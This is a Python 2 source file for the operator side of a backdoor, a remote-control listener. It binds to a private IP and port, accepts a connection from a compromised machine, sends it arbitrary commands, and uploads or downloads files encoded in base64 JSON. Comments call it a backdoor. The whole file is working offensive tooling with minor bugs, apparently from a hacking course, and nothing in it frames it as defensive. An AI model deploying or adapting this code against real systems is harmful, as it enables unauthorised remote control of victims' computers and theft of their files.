import socket
import json
import base64
from ipaddress import collapse_addresses


class SocketListenerJSON:
    def __init__(self,ip,port):
        my_listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        my_listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        my_listener.bind((ip, port))
        my_listener.listen(0)
        print("Listening .....")
        (self.my_connection, my_address) = my_listener.accept()
        print("Connection OK from " + str(my_address))

    def json_send(self,data):
        json_data = json.dumps(data)
        self.my_connection.send(json_data)

    def json_receive(self):
        json_data =""
        while True:
            try:
                json_data =json_data + self.my_connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue
#implementing quit to terminate the application from both side
    def command_execution(self,command_input):
        self.json_send(command_input)
        if command_input[0] =="quit":
            self.my_connection.close()
            exit()
        return self.json_receive()
    # implementation of the function to save the file
    def save_file(self,path,content):
        with open(path,"wb") as my_file:
            my_file.write(base64.b64decode(content))
            return "Download Completed"

    #reading the file content we want to upload
    def get_file_content(self,path):
        with open(path,"rb") as my_file:
            return base64.b64encode(my_file.read())


# we are going to use a list to be able to execute multiple command in the backdoor
    def star_listener(self):
        while True:
            command_input = raw_input("Enter command: ")
            command_input = command_input.split(" ")
            try:
                #check the command before sending it
                if command_input[0] == "upload":
                    my_file_content = self.get_file_content(command_input[1])
                    command_input.append(my_file_content)

                command_output = self.command_execution(command_input)
                #verifying if the command is download to save the content instead of printing
                if command_input[0] =="download" and "Input_Error" not in command_output:
                 command_output = self.  save_file(command_input[1],command_output)
            except Exception:
                command_output = "Invalid input Error"
            print(command_output)
my_socket_listener = SocketListenerJSON("192.168.1.217",8080)
my_socket_listener.star_listener()